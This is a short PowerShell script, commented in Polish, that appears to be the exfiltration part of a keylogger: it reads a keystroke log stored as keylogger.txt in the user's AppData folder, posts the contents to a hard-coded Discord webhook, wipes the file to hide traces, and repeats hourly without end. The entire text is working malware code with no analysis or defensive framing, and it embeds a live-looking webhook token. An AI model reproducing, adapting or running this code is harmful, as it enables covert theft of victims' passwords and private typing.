$logFile = "$env:APPDATA\keylogger.txt"

# Twój Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1360942823821803540/9I6AgpJboKwPSgnCIfbxFshdEwhYTyOHrlYrNlnY-UkJvc1SjTyAtEu-8-KEyWv3iCuU"

# Funkcja do wysyłania logów
function Send-LogsToDiscord {
    if (Test-Path $logFile) {
        $content = Get-Content $logFile -Raw
        if ($content.Trim().Length -gt 0) {
            $payload = @{
                "content" = "📄 **Keylogger Logi:**`n```\n$content\n```"
            } | ConvertTo-Json -Depth 10

            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

            # (opcjonalnie) Czyści plik po wysłaniu
            Clear-Content -Path $logFile
        }
    }
}

# Przykład użycia – wysyłaj co godzinę
while ($true) {
    Send-LogsToDiscord
    Start-Sleep -Seconds 3600
}
